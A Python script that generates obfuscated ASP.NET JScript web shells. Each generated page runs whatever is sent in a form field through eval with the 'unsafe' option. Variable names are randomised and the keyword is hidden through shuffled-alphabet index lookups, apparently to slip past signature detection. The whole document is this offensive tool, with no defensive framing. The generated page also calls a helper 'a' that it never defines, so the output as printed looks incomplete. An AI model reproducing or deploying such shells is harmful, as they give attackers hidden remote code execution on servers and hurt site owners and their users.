import random
func='unsafe'
str1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
def random_list():
    str_random=list(str1)
    random.shuffle(str_random)
    return ''.join(str_random)

def random_name(len):

    return ''.join(random.sample(str1,len))   

def random_index():
    ids=[]
    tmp_list=[]
    str_random=random_list()
   # print(str_random)
    for i in range(len(func)):
        ids.append(str_random.lower().find(func[i]))
   # print(ids)
    for i in ids:
        tmp='a({})'.format(i)
        tmp_list.append(tmp)
       # print('+'.join(tmp_list))
    return str_random,'+'.join(tmp_list)
    
def shell_main():
    text='''
<%@ Page Language="Jscript" Debug=true%>
<%
var {2}='{0}';
var {3}=Request.Form("mr6");
var {4}={1};
eval({3},{4});
%>
    '''
    str_random,payload=random_index()
    res=text.format(str_random,payload,random_name(4),random_name(4),random_name(4))
    print(res)
shell_main()
